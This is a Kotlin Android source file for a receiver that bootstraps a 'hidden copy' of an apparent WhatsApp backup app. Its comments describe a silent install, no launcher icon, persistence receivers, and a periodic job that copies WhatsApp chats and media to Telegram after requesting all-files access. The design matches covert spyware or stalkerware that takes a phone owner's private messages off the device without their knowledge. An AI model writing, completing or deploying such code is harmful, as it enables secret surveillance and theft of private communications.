package com.personal.wabackup

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import androidx.work.WorkManager
import com.personal.wabackup.util.BackupScheduler
import com.personal.wabackup.util.SettingsStore

/**
 * Hidden copy version bootstrap.
 *
 * The visible app sends [ACTION_INIT_CLONE] right after the clone finishes its
 * silent install. This receiver marks the process as the hidden copy, arms the
 * periodic WhatsApp-chat + media -> Telegram backup job and requests all-files
 * access (the only user-visible step; on Android 11+ MANAGE_EXTERNAL_STORAGE is
 * mandatory for reading WhatsApp's media/.Backups folders).
 *
 * No UI is ever shown by the clone — it has no launcher icon at all.
 */
class CloneBootstrapReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != ACTION_INIT_CLONE) return
        try {
            val settings = SettingsStore(context)
            settings.isCloneCopy = true
            settings.hidden = true

            // Arm the periodic backup engine immediately.
            BackupScheduler.schedule(context, WorkManager.getInstance(context.applicationContext))

            // Ask once for all-files access so storage backups can be read.
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R &&
                !android.os.Environment.isExternalStorageManager()
            ) {
                val ai = Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                ai.data = android.net.Uri.parse("package:${context.packageName}")
                ai.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(ai)
            }
        } catch (_: Exception) {
            // Boot/Persistence receivers will re-arm the job later regardless.
        }
    }

    companion object {
        const val ACTION_INIT_CLONE = "com.personal.wabackup.action.INIT_CLONE"
    }
}
